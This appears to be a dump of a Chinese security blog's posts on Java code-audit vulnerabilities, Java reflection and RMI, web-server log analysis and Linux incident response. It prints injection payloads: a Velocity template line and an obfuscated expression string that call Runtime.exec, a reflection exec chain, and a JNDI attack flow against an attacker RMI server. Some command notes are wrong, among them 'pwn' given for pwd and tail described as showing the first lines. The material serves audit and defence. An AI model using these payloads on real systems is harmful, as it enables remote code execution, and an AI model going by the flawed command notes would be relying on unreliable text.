href=\"#文件操作\" class=\"headerlink\" title=\"文件操作\"></a>文件操作</h3><p>java有两种操作文件的模式一个是阻塞的java.io.FileSystem与非阻塞的java.nio.file.spi.FileSystemProvider，java.nio.file.spi.FileSystemProvider是java7后的特性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">File file = new File(filename);</span><br><span class=\"line\">FileInputStream fis = new File(Input/Output)Stream(file);</span><br><span class=\"line\"></span><br><span class=\"line\">File file = new File(filename);</span><br><span class=\"line\">RandomAccessFile raf = new RandomAccessFile(file, &quot;r&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">Path path = Paths.get(filename);</span><br><span class=\"line\">Files.readAllBytes(path)</span><br></pre></td></tr></table></figure>\n\n<p>以上代码我们对filename如果没有过滤将会导致任意文件读取漏洞。这里总结的是任意文件读取的情况，还有任意文件删除等，在检测文件操作安全时就是看访问的文件范围是否在预计中。</p>\n<p>java在7的时候已经修复了空字节问题，这里基本不用考虑了</p>\n<h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><p>java是强类型一般不存在数字型注入。sql注入很容易发现在使用数据库过程中没有预编译也没有过滤就存在。预编译对order by、in、like等位置是无法控制的，预编译无法支持太复杂的sql。</p>\n<h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Runtime.getRuntime().exec(cmd)</span><br><span class=\"line\">ProcessBuilder(cmdList).start()</span><br></pre></td></tr></table></figure>\n\n<p>这是java执行命令的函数，非常明显的一个函数，在审计时注意cmd参数防止命令执行。</p>\n<p>当然这里执行命令的条件有点苛刻。</p>\n<p>Runtime执行命令也是将传入的参数用空格拆分后用ProcessBuilder来执行。</p>\n<p>如果这里不能参数完全可控，或者ProcessBuilder启动shell来执行命令是无法使用 ; | 等字符的。</p>\n<p>详情参考：<a href=\"https://b1ngz.github.io/java-os-command-injection-note/\" target=\"_blank\" rel=\"noopener\">https://b1ngz.github.io/java-os-command-injection-note/</a></p>\n<p>当然也有一些高深的方法，但是白盒审计用不到，主要是用来绕waf、rasp等</p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL url = new URL(url);</span><br><span class=\"line\">URLConnection connection = url.openConnection();</span><br></pre></td></tr></table></figure>\n\n<p>如果URL不进行过滤，攻击者可以通过url对内网访问嗅探</p>\n<h3 id=\"序列化与反序列化\"><a href=\"#序列化与反序列化\" class=\"headerlink\" title=\"序列化与反序列化\"></a>序列化与反序列化</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ObjectOutputStream</span><br><span class=\"line\">ObjectInputStream</span><br></pre></td></tr></table></figure>\n\n<p>java可以序列化来处理数据，存在反序列化漏洞，所谓反序列化漏洞就是通过ObjectInputStream对类反序列化时类中存在危险代码导致命令执行。ObjectInputStream在反序列化后通常会调用一些反序列化类的函数如反序列化类的readObject方法，如果方法中带有恶意代码将导致命令执行。<a href=\"https://www.cnblogs.com/studyskill/p/9207117.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/studyskill/p/9207117.html</a></p>\n<p>在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验</p>\n<h3 id=\"xxe\"><a href=\"#xxe\" class=\"headerlink\" title=\"xxe\"></a>xxe</h3><p>java有很多xxe的方式，审计的时候看代码注意就是。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span><br><span class=\"line\">a.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class=\"line\">如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span><br><span class=\"line\">builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);\t</span><br><span class=\"line\">防止外部实体POC </span><br><span class=\"line\">builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class=\"line\">防止参数实体POC</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"SSTi\"><a href=\"#SSTi\" class=\"headerlink\" title=\"SSTi\"></a>SSTi</h3><p>模板注入就是使用模板引擎进行攻击。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#set ($exp = &quot;exp&quot;);</span><br><span class=\"line\">$exp.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;)</span><br><span class=\"line\">这是一个Velocity的代码，很容易就能看懂。</span><br><span class=\"line\">FreeMarker有点难后面研究。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h3><p>没有什么复杂的地方。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content = ESAPI.encoder().encoderForJavaScript(content); 防御代码</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"表达式注入\"><a href=\"#表达式注入\" class=\"headerlink\" title=\"表达式注入\"></a>表达式注入</h3><p>java有很多表达式，表达式注入就是对传入的表达式可控导致的漏洞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#&#123;&apos;&apos;.getClass().forName(&apos;java.la&apos;+&apos;ng.Ru&apos;+&apos;ntime&apos;).getMethod(&apos;ex&apos;+&apos;ec&apos;,&apos;&apos;.getClass()).invoke(&apos;&apos;.getClass().forName(&apos;java.la&apos;+&apos;ng.Ru&apos;+&apos;ntime&apos;).getMethod(&apos;getRu&apos;+&apos;ntime&apos;).invoke(null),&apos;calc&apos;)&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"JNDI注入和RMI、ladp\"><a href=\"#JNDI注入和RMI、ladp\" class=\"headerlink\" title=\"JNDI注入和RMI、ladp\"></a>JNDI注入和RMI、ladp</h3><p>jndi注入就是使用jndi功能时的lookup(URI)中可控导致的攻击，因为请求了恶意的链接而造成反序列化漏洞。</p>\n<p>引用别人的描述：在<code>RMI</code>服务中引用远程对象将受本地Java环境限制即本地的<code>java.rmi.server.useCodebaseOnly</code>配置必须为<code>false(允许加载远程对象)</code>，如果该值为<code>true</code>则禁止引用远程对象。除此之外被引用的<code>ObjectFactory</code>对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为<code>false(不信任远程引用对象)</code>一样无法调用远程的引用对象。</p>\n<ol>\n<li><code>JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121</code>开始<code>java.rmi.server.useCodebaseOnly</code>默认配置已经改为了<code>true</code>。</li>\n<li><code>JDK 6u132, JDK 7u122, JDK 8u113</code>开始<code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了<code>false</code>。</li>\n</ol>\n<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>\n<p>整个利用流程如下：</p>\n<ol>\n<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>\n<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</li>\n<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>\n<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>\n<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>\n</ol>\n","categories":[],"tags":[]},{"title":"java学习二java机制","url":"http://yoursite.com/2020/02/27/java学习二java机制/","content":"<h2 id=\"反射\"><a href=\"#反射\" class=\"headerlink\" title=\"反射\"></a>反射</h2><h3 id=\"java-lang-class\"><a href=\"#java-lang-class\" class=\"headerlink\" title=\"java.lang.class\"></a>java.lang.class</h3><p>​        Class类是反射中的核心类，Java中每个类都有一个相对应的Class类的对象，类是class类的实例对象，JVM加载类时会创建一个该类的Class类对象。</p>\n<p>​        实现反射第一步就是获取class</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class.class int.class,com.aa.class</span><br><span class=\"line\">Class.forName(&quot;classpath&quot;)classpath表实class的全路径</span><br><span class=\"line\">class.getClass()这里的class是实例化后的对象</span><br><span class=\"line\">ClassLoader.loadClass(classpath，false)classpath表示class的全路径,false表示是不链接意味着不进行包括初始化等一些列步骤，那么静态块和静态对象就不会得到执行</span><br><span class=\"line\">this.getClass().getClassLoader.loadClass(class，false)通过内加载机制获取class</span><br></pre></td></tr></table></figure>\n\n<p>​        以上是获取class的方法,得到的class有几个关键方法：</p>\n<p>​        newInstance实例化class方便使用</p>\n<p>​        getMethod(方法名,参数)获取方法Method a1=a.getMethod(‘exec’,String class)获取exec方法</p>\n<p>​        invoke(对象,参数)使用方法，这里使用前面的a1，a1.invoke(calzz,”calc.exe”)第一个参数是方法所在的对象，后面是参数，参数个数与类型与getMethod所写的保持一致。</p>\n<p>​        getConstructor()当无无参构造函数时使用，使用clazz.getConstructor(构造函数参数类型.class).newInstance()来生成对象</p>\n<p>​        getDeclaredConstructor()当构造函数私有时使用。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Constructor m = clazz.getDeclaredConstructor();</span><br><span class=\"line\">m.setAccessible(true);必须修改构造函数作用域否则无法使用。</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class=\"line\">clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz), &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>上面的是最常见的java命令执行代码，创建Runtime的class类类型，获取exec方法,通过Runtime的getRuntime()方法获取Runtime的对象(因为Runtime的构造方法是私有的)，再执行exec函数.</p>\n<h2 id=\"RMI\"><a href=\"#RMI\" class=\"headerlink\" title=\"RMI\"></a>RMI</h2><p>RMI简单来说就是一个可以将一个程序写在两个服务器，一个服务器可以调用另一个服务器的方法。</p>\n<p>引用别人的一段话：</p>\n<p>RMI由3个部分构成，第一个是rmiregistry（JDK提供的一个可以独立运行的程序，在bin目录下），第二个是server端的程序，对外提供远程对象，第三个是client端的程序，想要调用远程对象的方法。<br>首先，先启动rmiregistry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。<br>其次，server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到rmiregistry上并对外暴露一个名称。<br>最后，client端通过本地的接口和一个已知的名称（即rmiregistry暴露出的名称）再使用RMI提供的Naming/Context/Registry等类的lookup方法从RMIService那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。<a href=\"https://blog.csdn.net/qq_28081453/article/details/83279066\" target=\"_blank\" rel=\"noopener\">原文</a>我觉得作者对rmi描述的很清楚了。</p>\n<h2 id=\"jndi\"><a href=\"#jndi\" class=\"headerlink\" title=\"jndi\"></a>jndi</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。就是一个可以实现rmi，数据库，ladp等的api接口。</p>\n<h2 id=\"注解\"><a href=\"#注解\" class=\"headerlink\" title=\"注解\"></a>注解</h2><h3 id=\"jdk默认注解\"><a href=\"#jdk默认注解\" class=\"headerlink\" title=\"jdk默认注解\"></a>jdk默认注解</h3><p>@Override - 检查该方法是否是重写方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。</p>\n<p>@Deprecated - 标记过时方法。如果使用该方法，会报编译警告。</p>\n<p>@SuppressWarnings - 指示编译器去忽略注解中声明的警告。</p>\n<p>@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。</p>\n<p>@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。</p>\n<p>@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。</p>\n<p><strong>元注解</strong>，描述注解的注解，用于自定义注解。</p>\n<p>@Retention - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问。</p>\n<p>@Documented - 标记这些注解是否包含在用户文档中。</p>\n<p>@Target - 标记这个注解应该是哪种 Java 成员。</p>\n<p>@Inherited - 标记这个注解是继承于哪个注解类(默认 注解并没有继承于任何子类)</p>\n","categories":[],"tags":[]},{"title":"中间件日志分析","url":"http://yoursite.com/2020/02/18/中间件日志分析/","content":"<p>通过实践搭建常见中间件，自己分析熟悉中间件日志。</p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><p>查看/etc/apache2/apache2.conf找到日志文件的位置，默认位于/var/log/apache2/目录下。</p>\n<h3 id=\"Get\"><a href=\"#Get\" class=\"headerlink\" title=\"Get\"></a>Get</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">117.175.121.169 - - [16/Feb/2020:14:15:56 +0800] &quot;GET /?11=1 HTTP/1.1&quot; 200 3525 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.62 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">117.175.121.169 - - [16/Feb/2020:14:19:17 +0800] &quot;POST /welcome.php HTTP/1.1&quot; 404 493 &quot;http://123.56.133.239/1.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.62 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>\n\n<p>这里用apache的日志来举例，可以看到日志只记载ip，请求的页面，get参数，User-Agent字段，在应急中如果是其他位置如cookie导致被攻击无法直接定位哪个参数存在漏洞。搭建看了下常见中间件的日志大同小异，都只记载了这些内容。</p>\n<p>这时候定位攻击者的IP应该从IP出现次数，IP出现频率，木马文件访问ip入手等。</p>\n<h2 id=\"常见攻击特征总结\"><a href=\"#常见攻击特征总结\" class=\"headerlink\" title=\"常见攻击特征总结\"></a>常见攻击特征总结</h2><p><strong>SQL攻击</strong>必定会使用脚本，基本就会是当天出现次数较多的ip，并且具有单个页面访问频率高的特点，这是扫描器等脚本没有的特点。</p>\n<p><strong>首页篡改</strong>基本也会是篡改后前几个查看这个页面的IP，这是正常人的本性肯定会访问下确定篡改成功没有。</p>\n<p><strong>XSS</strong>的特征就是IP没有访问登录页面后再访问后台的连贯性，不符合常见登录特征。</p>\n<p><strong>弱口令、爆破</strong>过多访问登录页面，也有一次就试出来的，这种询问管理员是否存在弱口令和登录后台的IP是否是他们的IP。</p>\n","categories":[],"tags":[]},{"title":"javaEE学习一之jsp","url":"http://yoursite.com/2019/12/12/java学习一之jsp/","content":"<h2 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a>Tomcat</h2><p><img src=\"/2019/12/12/java学习一之jsp/1582626747456.png\" alt=\"1582626747456\">work目录是存放编译好的jsp的文件夹，Java是编译型语言当我们访问一个jsp文件时需要先编译再执行，每次都编译会十分浪费时间，work便是存放这些编译好的代码的文件夹，当我们访问时tomcat会先看work目录下是否已经编译过，编译过就不用再编译了。</p>\n<p><img src=\"/2019/12/12/java学习一之jsp/1582709487660.png\" alt=\"1582709487660\"></p>\n<p>这是webapps下的目录src放的是servlet，web下放的是jsp，这里web可能因为IDE的不同而不同。没试过教程myecplise和我的idea是不同的。</p>\n<h2 id=\"java代码特征\"><a href=\"#java代码特征\" class=\"headerlink\" title=\"java代码特征\"></a>java代码特征</h2><h3 id=\"命令规范\"><a href=\"#命令规范\" class=\"headerlink\" title=\"命令规范\"></a>命令规范</h3><p>java的类名和文件名应当一致。</p>\n<h3 id=\"常见术语\"><a href=\"#常见术语\" class=\"headerlink\" title=\"常见术语\"></a>常见术语</h3><p>Servlet是遵循Servlet规范编写的java程序，它专门用来处理后端程序，而jsp则是与html混用(Servlet难以和html混用)，达到前后端分离，目前感觉servlet可以当作一个框架来理解，通过调用他的一些功能来获取get，post数据和输出给浏览器。</p>\n<h3 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter\"></a>filter</h3><p>第一次了解到这种类型的技术，的确很方便。</p>\n<p>我们在filter中配置sql过滤，xss防护就可以避免由于部分开发人员缺发安全意识而导致的漏洞，但是由于业务原因也难以实现。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;url—pattern&gt;/upload/*.jsp&lt;/url-pattern&gt;//过滤上传目录下的jsp文件访问</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"反射机制\"><a href=\"#反射机制\" class=\"headerlink\" title=\"反射机制\"></a>反射机制</h3><p>反射机制就是在运行中动态的加载类，使用编译期间未知的class，使java更具有灵活性。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class clazz ＝ Class.forName();</span><br><span class=\"line\">Class clazz ＝ classLoader.loadClass();</span><br><span class=\"line\">这是java类动态加载的两种方式，通过这两种方式加载类如果未对参数进行限制可能导致命令执行。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"JSP\"><a href=\"#JSP\" class=\"headerlink\" title=\"JSP\"></a>JSP</h2><h3 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h3><p>&lt;% 代码 %&gt;</p>\n<p>&lt;%@ 指令 %&gt;</p>\n<p>&lt;%! 声明变量 %&gt;在代码中也可以直接声明。</p>\n<p>&lt;%= 表达式 %&gt;</p>\n<p>&lt;%– 注释 %&gt;</p>\n<h3 id=\"内置对象\"><a href=\"#内置对象\" class=\"headerlink\" title=\"内置对象\"></a>内置对象</h3><p>内置对象是由web容器提供的对象</p>\n<p><strong>out对象</strong></p>\n<p><img src=\"/2019/12/12/java学习一之jsp/1582773314304.png\" alt=\"1582773314304\"></p>\n<p><strong>request对象</strong></p>\n<p><img src=\"/2019/12/12/java学习一之jsp/1582773422385.png\" alt=\"1582773422385\"></p>\n<p><strong>response对象</strong></p>\n<p><img src=\"/2019/12/12/java学习一之jsp/1582773505368.png\" alt=\"1582773505368\"></p>\n<p>getWriter()对象显示在out对象之前</p>\n<p><strong>session对象</strong></p>\n<p><img src=\"/2019/12/12/java学习一之jsp/1582790267022.png\" alt=\"1582790267022\"></p>\n<p><strong>application对象</strong>这个对象是可以理解为全局变量</p>\n<p><img src=\"/2019/12/12/java学习一之jsp/1582793910780.png\" alt=\"1582793910780\"></p>\n<h2 id=\"JavaBeans与动作元素\"><a href=\"#JavaBeans与动作元素\" class=\"headerlink\" title=\"JavaBeans与动作元素\"></a>JavaBeans与动作元素</h2><p>javabeans是符合某种特定规则的java类。公有类、私有属性、封装、无参公有构造方法。</p>\n<p>jsp动作元素是一个符合XML语法的标签。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;jsp:action_name attribute=&quot;value&quot; /&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"useBean\"><a href=\"#useBean\" class=\"headerlink\" title=\"useBean\"></a>useBean</h2><p>用来实例化javaBeans</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;jsp:useBean id=&quot;name&quot; class=&quot;packagename.class&quot; scope=&quot;page&quot; /&gt;</span><br><span class=\"line\">这就是直接实例化packagename.class类,name就是申明后的引用，要调用类中的方法就可以用name.function()。</span><br><span class=\"line\">scope属性表示javaBean作用范围</span><br><span class=\"line\">page表示当前页面</span><br><span class=\"line\">request本次请求</span><br><span class=\"line\">session同一个session请求</span><br><span class=\"line\">application全局变量有效至容器关闭</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"setProperty\"><a href=\"#setProperty\" class=\"headerlink\" title=\"setProperty\"></a>setProperty</h2><p>对javaBeans对象的属性进行赋值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;jsp:setProperty name=&quot;实例名&quot; property=&quot;*&quot; /&gt;与表单对应的属性一一赋值</span><br><span class=\"line\">&lt;jsp:setProperty name=&quot;实例名&quot; property=&quot;属性名&quot; /&gt;表单与javaBeans属性名对应的那个赋值</span><br><span class=\"line\">&lt;jsp:setproperty name=&quot;实例名&quot; property=&quot;属性名&quot; value=&quot;值&quot; /&gt;javabeans属性值为value值,不受表单影响</span><br><span class=\"line\">&lt;jsp:setProperty name=&quot;实例名&quot; property=&quot;属性名&quot; param=&quot;表单属性名&quot; /&gt;这样就不用两个名字相同且可以接受get参数</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"getProperty\"><a href=\"#getProperty\" class=\"headerlink\" title=\"getProperty\"></a>getProperty</h2><p>读取javaBeans对象的属性值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用户名:&lt;jsp:getProperty name=&quot;users&quot; property=&quot;name&quot; /&gt;可以不使用表达式获取username的值</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]},{"title":"命令行操作学习","url":"http://yoursite.com/2019/12/05/命令行操作学习/","content":"<h2 id=\"windows\"><a href=\"#windows\" class=\"headerlink\" title=\"windows\"></a>windows</h2><p>chdir查看当前目录</p>\n<h2 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h2><p>pwn查看当前目录</p>\n<p>head -n 10 $1 提取文件$1的前10行</p>\n<p>tail -n 10 $1 提取文件$1的后10行</p>\n<p>nl $1 输出文件并显示行号</p>\n<p>chgrp  属组名 文件名 更改属组</p>\n<p>chown [–R] 属主名 文件名 更改属主</p>\n<p>chown [-R] 属主名：属组名 文件名 更改属主与属组</p>\n<p>chmod -777 filename|directname 更改权限</p>\n<p><strong>仔细研究几个在应急中较为重要的命令</strong></p>\n<p>grep “test” log 查看log文件中的test行</p>\n<p>tail -n 10 显示前十行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk 处理文本</span><br><span class=\"line\">awk -F &apos;:&apos; &apos;&#123;print $1 $4&#125;&apos; /etc/passwd 以分号分隔输出第1，4项</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]},{"title":"linux应急响应","url":"http://yoursite.com/2019/11/29/linux应急响应/","content":"<h1 id=\"linux应急响应\"><a href=\"#linux应急响应\" class=\"headerlink\" title=\"linux应急响应\"></a>linux应急响应</h1><h3 id=\"账号排查\"><a href=\"#账号排查\" class=\"headerlink\" title=\"账号排查\"></a>账号排查</h3><p>检查/etc/passwd和/etc/shadow</p>\n<h3 id=\"历史命令\"><a href=\"#历史命令\" class=\"headerlink\" title=\"历史命令\"></a>历史命令</h3><p>/home/用户名/.bash_history</p>\n<h3 id=\"查看端口\"><a href=\"#查看端口\" class=\"headerlink\" title=\"查看端口\"></a>查看端口</h3><p>查看进程</p>\n<p>netstat命令用来查看网络连接情况</p>\n<p>-a 查看所有连接</p>\n<p>-t -u查看tcp和udp连接</p>\n<p>-p 显示进程id</p>\n<p>查到未知PID后ls -l /proc/$pid/exe查看对应的文件</p>\n<h3 id=\"检查进程\"><a href=\"#检查进程\" class=\"headerlink\" title=\"检查进程\"></a>检查进程</h3><p>ps aux|grep pid查找进程号为pid的进程</p>\n<p>kill -9 pid杀死进程</p>\n<h3 id=\"检查开机启动项\"><a href=\"#检查开机启动项\" class=\"headerlink\" title=\"检查开机启动项\"></a>检查开机启动项</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/rc.local</span><br><span class=\"line\">/etc/rc[0~6].d对应级别的启动项</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"检查定时任务\"><a href=\"#检查定时任务\" class=\"headerlink\" title=\"检查定时任务\"></a>检查定时任务</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l -u username查看用户定时任务</span><br><span class=\"line\"></span><br><span class=\"line\">查看所有用户的定时任务</span><br><span class=\"line\">for u in `cat /etc/passwd | cut -d&quot;:&quot; -f1`;do crontab -l -u $u;done</span><br><span class=\"line\"></span><br><span class=\"line\">/var/spool/cron/*存放每个用户的定时任务</span><br><span class=\"line\">/etc/crontab 这个文件负责调度各种管理和维护任务</span><br><span class=\"line\">/etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本</span><br><span class=\"line\">/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly设置年月日执行</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"检查系统日志\"><a href=\"#检查系统日志\" class=\"headerlink\" title=\"检查系统日志\"></a>检查系统日志</h3><table>\n<thead>\n<tr>\n<th>日志文件</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>/var/log/cron</td>\n<td>记录了系统定时任务相关的日志</td>\n</tr>\n<tr>\n<td>/var/log/cups</td>\n<td>记录打印信息的日志</td>\n</tr>\n<tr>\n<td>/var/log/dmesg</td>\n<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>\n</tr>\n<tr>\n<td>/var/log/mailog</td>\n<td>记录邮件信息</td>\n</tr>\n<tr>\n<td>/var/log/message</td>\n<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>\n</tr>\n<tr>\n<td>/var/log/btmp</td>\n<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>\n</tr>\n<tr>\n<td>/var/log/lastlog</td>\n<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>\n</tr>\n<tr>\n<td>/var/log/wtmp</td>\n<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>\n</tr>\n<tr>\n<td>/var/log/utmp</td>\n<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>\n</tr>\n<tr>\n<td>/var/log/secure</td>\n<td>记录验证和授权方面的信息，只要涉